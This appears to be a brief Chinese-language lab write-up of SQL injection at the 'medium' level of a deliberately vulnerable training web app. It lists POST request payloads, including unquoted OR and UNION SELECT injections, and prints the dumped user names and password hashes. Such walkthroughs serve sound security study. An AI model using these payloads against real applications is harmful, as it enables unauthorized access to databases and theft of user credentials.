# SQL Injection

medium 難度換成使用選單 POST 送出

```json
{
  "id": "3",
  "Submit": "Submit"
}
```

### try

```sql
3' OR '1'='1
```

```sql
id=3'%20OR%20'1'%3D'1&Submit=Submit
```

```sql
id=3' OR '1'%3D'1&Submit=Submit
```

多試幾次之後，發現將 `'` 拿掉就可以注入了 @@

Request Body:

```sql
id=1 OR 2&Submit=Submit
```

因為之前已經知道欄位名稱了，所以直接選取即可

Request Body:

```sql
id=1 union select user_id, first_name, last_name from users;&Submit=Submit
```

### Done

Request Body:

```sql
id=1 union select last_name,password from users;&Submit=Submit
```

```sql
ID: 1 union select last_name,password from users;
First name: admin
Surname: admin

ID: 1 union select last_name,password from users;
First name: admin
Surname: b59c67bf196a4758191e42f76670ceba

ID: 1 union select last_name,password from users;
First name: Brown
Surname: e99a18c428cb38d5f260853678922e03

ID: 1 union select last_name,password from users;
First name: Me
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1 union select last_name,password from users;
First name: Picasso
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1 union select last_name,password from users;
First name: Smith
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
